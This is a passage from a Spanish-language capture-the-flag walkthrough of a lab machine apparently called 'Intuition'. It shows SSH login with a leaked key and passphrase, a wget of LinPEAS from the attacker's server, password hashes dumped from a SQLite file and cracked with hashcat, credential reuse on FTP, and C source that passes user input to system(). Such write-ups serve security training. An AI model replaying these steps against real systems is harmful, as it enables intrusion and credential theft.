</span></span></span><span class=line><span class=cl><span class=go>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfUe6nu6udKETqHA3v4sOjhIA4sxSwJOpWJsS//l6KBOcHRD6qJiFZeyQ5NkHiEKPIEfsHuFMzykx8lAKK79WWvR0BV6ZwHSQnRQByD9eAj60Z/CZNcq19PHr6uaTRjHqQ/zbs7pzWTs+mdCwKLOU7x+X0XGGmtrPH4/YODxuOwP9S7luu0XmG0m7sh8I1ETISobycDN/2qa1E/w0VBNuBltR1BRBdDiGObtiZ1sG+cMsCSGwCB0sYO/3aa5Us10N2v3999T7u7YTwJuf9Vq5Yxt8VqDT/t+JXU0LuE5xPpzedBJ5BNGNwAPqkEBmjNnQsYlBleco6FN4La7Irn74fb/7OFGR/iHuLc3UFQkTlK7LNXegrKxxb1fLp2g4B1yPr2eVDX/OzbqAE789NAv1Ag7O5H1IHTH2BTPTF3Fsm7pk+efwRuTusue6fZteAipv4rZAPKETMLeBPbUGoxPNvRy6VLfTLV+CzYGJTdrnNHWYQ7+sqbcJFGDBQ+X3QelE= dev_acc@local
</span></span></span></code></pre></div><p>De manera que esta es una key para el usuario <code>dev_acc</code>.</p><p>Podemos entonces usar esta key para tratar de loguearnos a trav√©s de <code>SSH</code> como el usuario <code>dev_acc</code> proveyendo la passphrase <code>Y27SH19HDIWD</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh -i found_id_rsa dev_acc@10.10.11.15
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>The authenticity of host &#39;10.10.11.15 (10.10.11.15)&#39; can&#39;t be established.
</span></span></span><span class=line><span class=cl><span class=go>ED25519 key fingerprint is SHA256:++SuiiJ+ZwG7d5q6fb9KqhQRx1gGhVOfGR24bbTuipg.
</span></span></span><span class=line><span class=cl><span class=go>This key is not known by any other names.
</span></span></span><span class=line><span class=cl><span class=go>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span class=line><span class=cl><span class=go>Warning: Permanently added &#39;10.10.11.15&#39; (ED25519) to the list of known hosts.
</span></span></span><span class=line><span class=cl><span class=go>Enter passphrase for key &#39;found_id_rsa&#39;:
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dev_acc@intuition:~$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dev_acc
</span></span></span></code></pre></div><p>y obtener la flag de usuario.</p><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Para obtener algunas pistas para la escalada de privilegios decido subir <code>LinPEAS</code> (el cual puede ser descargado desde <a href=https://github.com/peass-ng/PEASS-ng/releases class=external-link target=_blank rel=noopener>su repositorio de Github</a>) con <code>wget</code> luego de iniciar un servidor temporal <code>Python</code> <code>HTTP</code> en el puerto <code>8000</code>. En mi m√°quina de atacante, corro:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls &amp;&amp; python3 -m http.server 8000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>linpeas.sh
</span></span></span></code></pre></div><p>Y en la m√°quina v√≠ctima, pasamos el binario y lo ejecutamos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dev_acc@intuition:~$ wget http://10.10.16.6:8000/linpeas.sh -O /tmp/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--2024-05-27 20:35:44--  http://10.10.16.6:8000/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go>Connecting to 10.10.16.6:8000... connected.
</span></span></span><span class=line><span class=cl><span class=go>HTTP request sent, awaiting response... 200 OK
</span></span></span><span class=line><span class=cl><span class=go>Length: 847815 (828K) [text/x-sh]
</span></span></span><span class=line><span class=cl><span class=go>Saving to: ‚Äò/tmp/linpeas.sh‚Äô
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/tmp/linpeas.sh                            100%[=======================================================================================&gt;] 827.94K   192KB/s    in 4.6s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024-05-27 20:35:49 (180 KB/s) - ‚Äò/tmp/linpeas.sh‚Äô saved [847815/847815]
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dev_acc@intuition:~$ chmod +x /tmp/linpeas.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dev_acc@intuition:~$ /tmp/linpeas.sh
</span></span></span></code></pre></div><p>Luego de correrlo, soy capaz de ver algunos archivos de bases de datos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
</span></span></span><span class=line><span class=cl><span class=go>Found /var/lib/command-not-found-backup/commands.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 881, cookie 0x4, schema 4, UTF-8, version-valid-for 5
</span></span></span><span class=line><span class=cl><span class=go>Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 3, database pages 6, cookie 0x5, schema 4, UTF-8, version-valid-for 3
</span></span></span><span class=line><span class=cl><span class=go>Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 5
</span></span></span><span class=line><span class=cl><span class=go>Found /var/www/app/blueprints/auth/users.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 18, database pages 4, cookie 0x1, schema 4, UTF-8, version-valid-for 18
</span></span></span><span class=line><span class=cl><span class=go>Found /var/www/app/blueprints/report/reports.db: SQLite 3.x database, last written using SQLite version 3034001, file counter 73, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 73
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> -&gt; Extracting tables from /var/lib/command-not-found-backup/commands.db (limit 20)
</span></span></span><span class=line><span class=cl><span class=go> -&gt; Extracting tables from /var/lib/fwupd/pending.db (limit 20)
</span></span></span><span class=line><span class=cl><span class=go> -&gt; Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
</span></span></span><span class=line><span class=cl><span class=go> -&gt; Extracting tables from /var/www/app/blueprints/auth/users.db (limit 20)
</span></span></span><span class=line><span class=cl><span class=go> -&gt; Extracting tables from /var/www/app/blueprints/report/reports.db (limit 20)
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>donde puedo ver una base de datos <code>SQLite</code>.</p><p>Tratamos de leerla:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dev_acc@intuition:~$ cd /var/www/app/blueprints/auth/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dev_acc@intuition:/var/www/app/blueprints/auth$ sqlite3 users.db
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SQLite version 3.37.2 2022-01-06 13:25:41
</span></span></span><span class=line><span class=cl><span class=go>Enter &#34;.help&#34; for usage hints.
</span></span></span><span class=line><span class=cl><span class=go>sqlite&gt; .tables
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>users
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>sqlite&gt; select * from users;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>1|admin|sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606|admin
</span></span></span><span class=line><span class=cl><span class=go>2|adam|sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43|webdev
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>sqlite&gt;
</span></span></span></code></pre></div><p>Encontramos 2 hashes para los usuarios <code>admin</code> y <code>adam</code>.</p><p>Guardo ambos hashes en mi m√°quina de atacante en un archivo llamado <code>hashes_found</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat hashes_found
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606
</span></span></span><span class=line><span class=cl><span class=go>sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43
</span></span></span></code></pre></div><p>Ahora trato de crackear estos hashes a trav√©s de un <code>Brute Force Password Cracking</code> con <code>Hashcat</code>. Busco por <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" class=external-link target=_blank rel=noopener>hashes de ejemplo para Hashcat</a> y pued over que el modo <code>30120</code> calza con el de nuestros hashes (adem√°s, la descripci√≥n para este modo/hash es <code>Python Werkzeug SHA256 (HMAC-SHA256 (key = $salt)) *</code>, lo cual calza con el servicio <code>Flask</code> hallado previamente). Por ende, corremos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ hashcat hashes_found /usr/share/wordlists/rockyou.txt -m 30120 -O
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43:adam gray
</span></span></span><span class=line><span class=cl><span class=go>Approaching final keyspace - workload adjusted.
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>Donde somos capaces de hallar una contrase√±a <code>adam gray</code>.</p><p>Reviso por otros usuarios en esta m√°quina. Tenemos otros 2 usuarios llamados <code>lopez</code> y <code>adam</code>, pero esta contrase√±a no nos sirve para pivotear a estos usuarios:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dev_acc@intuition:/var/www/app/blueprints/auth$ ls /home
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>adam  dev_acc  lopez
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dev_acc@intuition:/var/www/app/blueprints/auth$ su lopez
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Password:
</span></span></span><span class=line><span class=cl><span class=go>su: Authentication failure
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dev_acc@intuition:/var/www/app/blueprints/auth$ su adam
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Password:
</span></span></span><span class=line><span class=cl><span class=go>su: Authentication failure
</span></span></span></code></pre></div><p>De la intrusi√≥n, y tambi√©n del output de <code>LinPEAS</code>, recuerdo que el servicio <code>FTP</code> estaba corriendo en esta m√°quina. Si tratamos de loguearnos como el usuario <code>adam</code> y usamos la password crackeada, tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dev_acc@intuition:/var/www/app/blueprints/auth$ ftp adam@localhost
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Connected to localhost.
</span></span></span><span class=line><span class=cl><span class=go>220 pyftpdlib 1.5.7 ready.
</span></span></span><span class=line><span class=cl><span class=go>331 Username ok, send password.
</span></span></span><span class=line><span class=cl><span class=go>Password:
</span></span></span><span class=line><span class=cl><span class=go>230 Login successful.
</span></span></span><span class=line><span class=cl><span class=go>Remote system type is UNIX.
</span></span></span><span class=line><span class=cl><span class=go>Using binary mode to transfer files.
</span></span></span><span class=line><span class=cl><span class=go>ftp&gt;
</span></span></span></code></pre></div><p>Estas credenciales funcionan para el servicio <code>FTP</code>.</p><p>Revisando qu√© es lo que tenemos dentro de este servicio, encontramos algunos archivos de respaldo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>ftp&gt; ls
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>229 Entering extended passive mode (|||52591|).
</span></span></span><span class=line><span class=cl><span class=go>125 Data connection already open. Transfer starting.
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x   3 root     1002         4096 Apr 10 08:21 backup
</span></span></span><span class=line><span class=cl><span class=go>226 Transfer complete.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ftp&gt; cd backup
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>250 &#34;/backup&#34; is the current directory.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ftp&gt; ls
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>229 Entering extended passive mode (|||49375|).
</span></span></span><span class=line><span class=cl><span class=go>125 Data connection already open. Transfer starting.
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x   2 root     1002         4096 Apr 10 08:21 runner1
</span></span></span><span class=line><span class=cl><span class=go>226 Transfer complete.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ftp&gt; cd runner1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>250 &#34;/backup/runner1&#34; is the current directory.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ftp&gt; ls
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>229 Entering extended passive mode (|||47211|).
</span></span></span><span class=line><span class=cl><span class=go>125 Data connection already open. Transfer starting.
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x   1 root     1002          318 Apr 06 00:25 run-tests.sh
</span></span></span><span class=line><span class=cl><span class=go>-rwxr-xr-x   1 root     1002        16744 Oct 19  2023 runner1
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--   1 root     1002         3815 Oct 19  2023 runner1.c
</span></span></span><span class=line><span class=cl><span class=go>226 Transfer complete.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ftp&gt;
</span></span></span></code></pre></div><p>Encontramos archivos. Nos descargamos estos archivos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>ftp&gt; mget .
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>mget run-tests.sh [anpqy?]? y
</span></span></span><span class=line><span class=cl><span class=go>229 Entering extended passive mode (|||46833|).
</span></span></span><span class=line><span class=cl><span class=go>125 Data connection already open. Transfer starting.
</span></span></span><span class=line><span class=cl><span class=go>100% |******************************************************************************************************************************|   318      295.19 KiB/s    00:00 ETA
</span></span></span><span class=line><span class=cl><span class=go>226 Transfer complete.
</span></span></span><span class=line><span class=cl><span class=go>318 bytes received in 00:00 (199.32 KiB/s)
</span></span></span><span class=line><span class=cl><span class=go>mget runner1 [anpqy?]? y
</span></span></span><span class=line><span class=cl><span class=go>229 Entering extended passive mode (|||44975|).
</span></span></span><span class=line><span class=cl><span class=go>150 File status okay. About to open data connection.
</span></span></span><span class=line><span class=cl><span class=go>100% |******************************************************************************************************************************| 16744        9.13 MiB/s    00:00 ETA
</span></span></span><span class=line><span class=cl><span class=go>226 Transfer complete.
</span></span></span><span class=line><span class=cl><span class=go>16744 bytes received in 00:00 (7.20 MiB/s)
</span></span></span><span class=line><span class=cl><span class=go>mget runner1.c [anpqy?]? y
</span></span></span><span class=line><span class=cl><span class=go>229 Entering extended passive mode (|||49583|).
</span></span></span><span class=line><span class=cl><span class=go>150 File status okay. About to open data connection.
</span></span></span><span class=line><span class=cl><span class=go>100% |******************************************************************************************************************************|  3815        2.28 MiB/s    00:00 ETA
</span></span></span><span class=line><span class=cl><span class=go>226 Transfer complete.
</span></span></span><span class=line><span class=cl><span class=go>3815 bytes received in 00:00 (1.87 MiB/s)
</span></span></span></code></pre></div><p>Una vez descargado, si revisamos el contenido del script <code>run-test.sh</code> descargado, tenemos un script en <code>Bash</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=c1># List playbooks</span>
</span></span><span class=line><span class=cl>./runner1 list
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Run playbooks [Need authentication]</span>
</span></span><span class=line><span class=cl><span class=c1># ./runner run [playbook number] -a [auth code]</span>
</span></span><span class=line><span class=cl><span class=c1>#./runner1 run 1 -a &#34;UHI75GHI****&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Install roles [Need authentication]</span>
</span></span><span class=line><span class=cl><span class=c1># ./runner install [role url] -a [auth code]</span>
</span></span><span class=line><span class=cl><span class=c1>#./runner1 install http://role.host.tld/role.tar -a &#34;UHI75GHI****&#34;</span>
</span></span></code></pre></div><p>Este script simplemente corre el archivo <code>runner1</code> con el argumento/comando <code>list</code>.
La √∫ltima l√≠nea se ve interesante dado que se ve como un tipo de autenticaci√≥n.</p><p>Leyendo el archivo <code>runner1.c</code> tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// Version : 1
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;dirent.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;openssl/md5.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define INVENTORY_FILE &#34;/opt/playbooks/inventory.ini&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#define PLAYBOOK_LOCATION &#34;/opt/playbooks/&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#define ANSIBLE_PLAYBOOK_BIN &#34;/usr/bin/ansible-playbook&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#define ANSIBLE_GALAXY_BIN &#34;/usr/bin/ansible-galaxy&#34;
</span></span></span><span class=line><span class=cl><span class=cp>#define AUTH_KEY_HASH &#34;0feda17076d793c2ef2870d7427ad4ed&#34;
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>check_auth</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>auth_key</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>digest</span><span class=p>[</span><span class=n>MD5_DIGEST_LENGTH</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nf>MD5</span><span class=p>((</span><span class=k>const</span> <span class=kt>unsigned</span> <span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>auth_key</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>auth_key</span><span class=p>),</span> <span class=n>digest</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>md5_str</span><span class=p>[</span><span class=mi>33</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>sprintf</span><span class=p>(</span><span class=o>&amp;</span><span class=n>md5_str</span><span class=p>[</span><span class=n>i</span><span class=o>*</span><span class=mi>2</span><span class=p>],</span> <span class=s>&#34;%02x&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>digest</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>md5_str</span><span class=p>,</span> <span class=n>AUTH_KEY_HASH</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>listPlaybooks</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>DIR</span> <span class=o>*</span><span class=n>dir</span> <span class=o>=</span> <span class=nf>opendir</span><span class=p>(</span><span class=n>PLAYBOOK_LOCATION</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>dir</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;Failed to open the playbook directory&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>dirent</span> <span class=o>*</span><span class=n>entry</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>playbookNumber</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>((</span><span class=n>entry</span> <span class=o>=</span> <span class=nf>readdir</span><span class=p>(</span><span class=n>dir</span><span class=p>))</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>entry</span><span class=o>-&gt;</span><span class=n>d_type</span> <span class=o>==</span> <span class=n>DT_REG</span> <span class=o>&amp;&amp;</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>entry</span><span class=o>-&gt;</span><span class=n>d_name</span><span class=p>,</span> <span class=s>&#34;.yml&#34;</span><span class=p>)</span> <span class=o>!=</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%d: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>playbookNumber</span><span class=p>,</span> <span class=n>entry</span><span class=o>-&gt;</span><span class=n>d_name</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>playbookNumber</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>closedir</span><span class=p>(</span><span class=n>dir</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>runPlaybook</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>playbookName</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>run_command</span><span class=p>[</span><span class=mi>1024</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nf>snprintf</span><span class=p>(</span><span class=n>run_command</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>run_command</span><span class=p>),</span> <span class=s>&#34;%s -i %s %s%s&#34;</span><span class=p>,</span> <span class=n>ANSIBLE_PLAYBOOK_BIN</span><span class=p>,</span> <span class=n>INVENTORY_FILE</span><span class=p>,</span> <span class=n>PLAYBOOK_LOCATION</span><span class=p>,</span> <span class=n>playbookName</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=n>run_command</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>installRole</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>roleURL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>install_command</span><span class=p>[</span><span class=mi>1024</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nf>snprintf</span><span class=p>(</span><span class=n>install_command</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>install_command</span><span class=p>),</span> <span class=s>&#34;%s install %s&#34;</span><span class=p>,</span> <span class=n>ANSIBLE_GALAXY_BIN</span><span class=p>,</span> <span class=n>roleURL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=n>install_command</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Usage: %s [list|run playbook_number|install role_url] -a &lt;auth_key&gt;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>auth_required</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>auth_key</span><span class=p>[</span><span class=mi>128</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>2</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>argc</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
